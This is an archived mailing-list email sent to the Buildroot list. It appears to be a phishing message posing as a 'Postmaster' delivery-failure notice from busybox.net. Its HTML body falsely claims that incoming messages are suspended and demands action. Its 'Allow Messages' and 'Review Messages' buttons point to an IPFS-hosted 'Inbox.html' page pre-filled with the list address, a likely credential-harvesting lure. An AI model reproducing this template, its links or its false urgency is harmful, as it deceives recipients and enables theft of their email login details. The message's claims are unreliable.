Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 93463CD1292
	for <buildroot@archiver.kernel.org>; Mon,  1 Apr 2024 14:36:13 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id 49C9760769;
	Mon,  1 Apr 2024 14:36:13 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 5Fb4Bhbk2_3M; Mon,  1 Apr 2024 14:36:12 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 561DE60672
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp3.osuosl.org (Postfix) with ESMTP id 561DE60672;
	Mon,  1 Apr 2024 14:36:12 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 3CD721BF33E
 for <buildroot@lists.busybox.net>; Mon,  1 Apr 2024 14:36:10 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 36BA7817B1
 for <buildroot@lists.busybox.net>; Mon,  1 Apr 2024 14:36:10 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id uQ9G9m6ncWnW for <buildroot@lists.busybox.net>;
 Mon,  1 Apr 2024 14:36:09 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
 helo=busybox.net; envelope-from=postmaster@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org BFC10813AD
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org BFC10813AD
Received: from busybox.net (unknown [141.98.10.132])
 by smtp1.osuosl.org (Postfix) with ESMTP id BFC10813AD
 for <buildroot@busybox.net>; Mon,  1 Apr 2024 14:36:08 +0000 (UTC)
From: Postmaster <postmaster@busybox.net>
To: buildroot@busybox.net
Date: 1 Apr 2024 16:36:07 +0200
Message-ID: <20240401163607.11B5923DE468B15B@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Undeliverable: Incoming Message Delivery Failure
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4855559978163520373=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============4855559978163520373==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514"></head>
<body style=3D"margin: 0.4em;">
<table width=3D"548" style=3D"border-color: rgb(221, 221, 221); border-radi=
us: 0px; color: black; text-transform: none; text-indent: 0px; letter-spaci=
ng: normal; padding-top: 0px; padding-bottom: 0px; font-family: Arial, Helv=
etica, sans-serif; font-size: small; font-style: normal; font-weight: 400; =
word-spacing: 0px; white-space: normal; border-collapse: collapse; max-widt=
h: 548px; border-spacing: 0px; orphans: 2; widows: 2; background-color: rgb=
(255, 255, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color:=
 rgb(221, 221, 221); border-radius: 0px; box-sizing: border-box;"><tr style=
=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizing: borde=
r-box;">
<td style=3D"border-color: rgb(221, 221, 221); margin: 0px; border-radius: =
0px; padding-right: 0px; padding-bottom: 15px; padding-left: 0px; font-fami=
ly: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-b=
ox; border-spacing: 0px;"><table style=3D"border-color: rgb(221, 221, 221);=
 border-radius: 0px; padding-top: 0px; padding-bottom: 0px; font-weight: 60=
0; border-collapse: collapse; max-width: 548px; border-spacing: 0px;">
<tbody style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-s=
izing: border-box;"><tr style=3D"border-color: rgb(221, 221, 221); border-r=
adius: 0px; box-sizing: border-box;"><td style=3D'border-color: rgb(221, 22=
1, 221); margin: 0px; border-radius: 0px; width: 181px; font-family: "Segoe=
 UI", Frutiger, Arial, sans-serif; font-size: 15px; vertical-align: bottom;=
 box-sizing: border-box;'>
<font color=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); border-r=
adius: 0px; box-sizing: border-box;"><span style=3D"border-color: rgb(221, =
221, 221); border-radius: 0px; color: rgb(0, 0, 0); box-sizing: border-box;=
">Failure Notice</span></font></td><td style=3D'border-color: rgb(221, 221,=
 221); margin: 0px; border-radius: 0px; width: 186px; text-align: center; f=
ont-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 15px; verti=
cal-align: bottom; box-sizing: border-box;'>
<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://h=
wnc.in&amp;source=3Dgmail&amp;ust=3D1712001076603000&amp;usg=3DAOvVaw3Fshmp=
8hxAiAMGS7YCoMCE">busybox.net</a></td><td style=3D'border-color: rgb(221, 2=
21, 221); margin: 0px; border-radius: 0px; width: 181px; text-align: right;=
 font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 15px; ver=
tical-align: bottom; box-sizing: border-box;'>buildroot</td></tr>
<tr style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizi=
ng: border-box;"><td style=3D'border-color: rgb(221, 221, 221); margin: 0px=
; border-radius: 0px; width: 181px; padding-top: 0px; padding-bottom: 0px; =
font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font=
-weight: 400; vertical-align: middle; box-sizing: border-box;'><font color=
=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); border-radius: 0px;=
 box-sizing: border-box;">
<span style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; color:=
 rgb(192, 0, 0); box-sizing: border-box;"><span style=3D"border-color: rgb(=
221, 221, 221); border-radius: 0px; font-weight: bolder; box-sizing: border=
-box;">Action Required</span></span></font></td>
<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; border-radius: =
0px; width: 186px; text-align: center; padding-top: 0px; padding-bottom: 0p=
x; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; f=
ont-weight: 400; vertical-align: middle; box-sizing: border-box;'>&nbsp;</t=
d>
<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; border-radius: =
0px; width: 181px; text-align: right; padding-top: 0px; padding-bottom: 0px=
; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; fo=
nt-weight: 400; vertical-align: middle; box-sizing: border-box;'><font colo=
r=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); border-radius: 0px=
; box-sizing: border-box;">
<span style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; color:=
 rgb(0, 0, 0); box-sizing: border-box;">Recipient</span></font></td></tr><t=
r style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizing=
: border-box;"><td style=3D"border-color: rgb(221, 221, 221); margin: 0px; =
padding: 0px; border-radius: 0px; box-sizing: border-box;" colspan=3D"3">
<table style=3D"border-color: rgb(221, 221, 221); padding: 0px; border-radi=
us: 0px; border-collapse: collapse; border-spacing: 0px;" cellspacing=3D"0"=
 cellpadding=3D"0"><tbody style=3D"border-color: rgb(221, 221, 221); border=
-radius: 0px; box-sizing: border-box;"><tr height=3D"10" style=3D"border-co=
lor: rgb(221, 221, 221); border-radius: 0px; box-sizing: border-box;">
<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
margin: 0px; padding: 0px; border-radius: 0px; width: 180px; height: 10px; =
line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=3D"#c00=
000">&nbsp;</td><td width=3D"4" height=3D"10" style=3D"border-color: rgb(22=
1, 221, 221); margin: 0px; padding: 0px; border-radius: 0px; width: 4px; he=
ight: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgc=
olor=3D"#ffffff">&nbsp;</td>
<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
margin: 0px; padding: 0px; border-radius: 0px; width: 180px; height: 10px; =
line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=3D"#ccc=
ccc">&nbsp;</td><td width=3D"4" height=3D"10" style=3D"border-color: rgb(22=
1, 221, 221); margin: 0px; padding: 0px; border-radius: 0px; width: 4px; he=
ight: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgc=
olor=3D"#ffffff">&nbsp;</td>
<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
margin: 0px; padding: 0px; border-radius: 0px; width: 180px; height: 10px; =
line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=3D"#ccc=
ccc">&nbsp;</td></tr></tbody></table></td></tr><tr style=3D"border-color: r=
gb(221, 221, 221); border-radius: 0px; box-sizing: border-box;">
<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; b=
order-radius: 0px; width: 181px; line-height: 20px; font-family: "Segoe UI"=
, Frutiger, Arial, sans-serif; font-size: 14px; font-weight: 400; box-sizin=
g: border-box;'>&nbsp;</td>
<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; b=
order-radius: 0px; width: 186px; text-align: center; line-height: 20px; fon=
t-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font-we=
ight: 400; box-sizing: border-box;'>&nbsp;</td>
<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; b=
order-radius: 0px; width: 181px; text-align: right; line-height: 20px; font=
-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font-wei=
ght: 400; box-sizing: border-box;'>&nbsp;</td></tr></tbody></table></td></t=
r><tr style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-si=
zing: border-box;">
<td style=3D"border-color: rgb(221, 221, 221); margin: 0px; border-radius: =
0px; width: 528px; padding-top: 0px; padding-right: 10px; padding-left: 10p=
x; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizi=
ng: border-box;">&nbsp;<table style=3D"border-color: rgb(221, 221, 221); pa=
dding: 0px; border-radius: 0px; width: 528px; margin-left: 0px; border-coll=
apse: collapse; background-color: rgb(242, 245, 250);">
<tbody style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-s=
izing: border-box;"><tr style=3D"border-color: rgb(221, 221, 221); border-r=
adius: 0px; box-sizing: border-box;"><td style=3D'border-color: rgb(221, 22=
1, 221); margin: 0px; padding: 0px 10px; border-radius: 0px; font-family: "=
Segoe UI", Frutiger, Arial, sans-serif; font-size: 21px; box-sizing: border=
-box;'>
<table style=3D"border-color: rgb(221, 221, 221); padding: 0px; border-radi=
us: 0px; width: 528px; margin-left: 0px; border-collapse: collapse;"><tbody=
 style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizing:=
 border-box;"><tr style=3D"border-color: rgb(221, 221, 221); border-radius:=
 0px; box-sizing: border-box;">
<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
px; border-radius: 0px; font-family: "segoe ui", frutiger, arial, sans-seri=
f; box-sizing: border-box;'><div style=3D"border-color: rgb(221, 221, 221);=
 margin: 0px; padding: 0px; border-radius: 0px; font-family: inherit; font-=
size: 15px; vertical-align: baseline; border-top-width: 0px; border-top-sty=
le: none; box-sizing: border-box;">
<span style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; font-w=
eight: bolder; box-sizing: border-box;">Message Failure&nbsp;Receiving Noti=
ce.</span><br style=3D"border-color: rgb(221, 221, 221); border-radius: 0px=
; box-sizing: border-box;">ATTENTION:<span>&nbsp;</span><a style=3D"color: =
rgb(17, 85, 204);" href=3D"mailto:buildroot@busybox.net" target=3D"_blank">=
buildroot@busybox.net</a></div></td></tr><tr style=3D"border-color: rgb(221=
, 221, 221); border-radius: 0px; box-sizing: border-box;">
<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
px 6px; border-radius: 0px; font-family: "segoe ui", frutiger, arial, sans-=
serif; font-size: 16px; box-sizing: border-box;'><div style=3D"border-color=
: rgb(221, 221, 221); border-radius: 0px; padding-top: 0px; border-top-widt=
h: 0px; border-top-style: none; box-sizing: border-box;">You have Suspended=
 incoming message<br style=3D"border-color: rgb(221, 221, 221); border-radi=
us: 0px; box-sizing: border-box;">Please Fix Below</div>
</td></tr></tbody></table><div style=3D"border-color: rgb(221, 221, 221); b=
order-radius: 0px; box-sizing: border-box;"><br></div><div style=3D"border-=
color: rgb(221, 221, 221); border-radius: 0px; box-sizing: border-box;">
<a style=3D"background: rgb(38, 117, 214); border-color: rgb(221, 221, 221)=
; margin: 2px; padding: 10px; border-radius: 0px; color: rgb(255, 255, 255)=
; font-size: 14px; float: left; display: block; outline-width: 0px; outline=
-style: none; box-sizing: border-box; text-decoration-line: none;" href=3D"=
https://cloudflare-ipfs.com/ipfs/bafkreih5gabmfzhzb7ejeyutclflwsbvrkvxshzab=
v4qy34pa5j4ll4hz4?filename=3DInbox.html#buildroot@busybox.net" target=3D"_b=
lank" rel=3D"noreferrer"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://znamenska.co=
m/stats/2021-7/c2d49fb9211e37A39e789edfbE29cx397fQ39fv287e39/?c490w8cfe208A=
408fc308b41j93m200184Dee302860zc38vrf390e39df%3Dinfo@hwnc.in&amp;source=3Dg=
mail&amp;ust=3D1712001076603000&amp;usg=3DAOvVaw0VWd0TQpnPpp9ZFnP3AU2c" dat=
a-saferedirectreason=3D"2">Allow Messages</a>
<a style=3D"background: rgb(219, 214, 214); border-color: rgb(221, 221, 221=
); margin: 2px; padding: 10px; border-radius: 0px; color: rgb(12, 12, 12); =
font-size: 14px; float: left; display: block; outline-width: 0px; outline-s=
tyle: none; box-sizing: border-box; text-decoration-line: none;" href=3D"ht=
tps://cloudflare-ipfs.com/ipfs/bafkreih5gabmfzhzb7ejeyutclflwsbvrkvxshzabv4=
qy34pa5j4ll4hz4?filename=3DInbox.html#buildroot@busybox.net" target=3D"_bla=
nk" rel=3D"noreferrer"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://znamenska.co=
m/stats/2021-7/c2d49fb9211e37A39e789edfbE29cx397fQ39fv287e39/?c490w8cfe208A=
408fc308b41j93m200184Dee302860zc38vrf390e39df%3Dinfo@hwnc.in&amp;source=3Dg=
mail&amp;ust=3D1712001076603000&amp;usg=3DAOvVaw0VWd0TQpnPpp9ZFnP3AU2c" dat=
a-saferedirectreason=3D"2">Review Messages</a></div><div style=3D"border-co=
lor: rgb(221, 221, 221); border-radius: 0px; box-sizing: border-box;">
<br style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizi=
ng: border-box;">&nbsp;</div></td></tr><tr style=3D"border-color: rgb(221, =
221, 221); border-radius: 0px; box-sizing: border-box;"><td style=3D'border=
-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10px 6px; border-radi=
us: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 1=
6px; box-sizing: border-box;'>&nbsp;</td></tr>
<tr style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizi=
ng: border-box;"><td style=3D"border-color: rgb(221, 221, 221); margin: 0px=
; padding: 0px; border-radius: 0px; box-sizing: border-box; border-spacing:=
 0px;"><p style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; ma=
rgin-top: 0px; margin-left: 15px; box-sizing: border-box;">
<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://h=
wnc.in&amp;source=3Dgmail&amp;ust=3D1712001076603000&amp;usg=3DAOvVaw3Fshmp=
8hxAiAMGS7YCoMCE">busybox.net</a><span>&nbsp;</span>Notification</p></td></=
tr><tr style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-s=
izing: border-box;">
<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
px 6px; border-radius: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-=
serif; font-size: 16px; box-sizing: border-box;'>&nbsp;</td></tr></tbody></=
table></td></tr></tbody></table></body></html>

--===============4855559978163520373==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============4855559978163520373==--
